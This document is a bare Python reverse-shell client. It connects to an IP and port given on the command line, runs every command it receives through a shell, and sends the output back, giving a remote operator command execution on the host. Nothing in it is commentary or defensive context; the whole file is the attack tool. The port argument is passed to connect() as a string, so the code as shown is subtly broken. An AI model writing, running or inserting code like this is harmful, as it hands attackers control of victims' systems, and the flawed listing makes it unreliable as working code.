import socket, subprocess, os, sys

def session_handler():
    print(f'[+] Connecting to {tar_ip}.')
    sock.connect((tar_ip, tar_port))
    print(f'[+] Connected to {tar_ip}')
    while True:
        try:
            print('[+] Awaiting response...')
            message = sock.recv(1024).decode()
            print(f'[+] Message received + {message}')
            if message == 'exit':
                print('[-] The server has terminated the session.')
                sock.close()
                break
            elif message.split(" ")[0] == 'cd':
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed to {cur_dir}')
                sock.send(cur_dir.encode())
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                sock.send(output)
        except KeyboardInterrupt:
            print('[+] Keyboard interrupt issued.')
            sock.close()
            break
        except Exception:
            sock.close()
            break


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tar_ip = sys.argv[1]
tar_port = sys.argv[2]
session_handler()
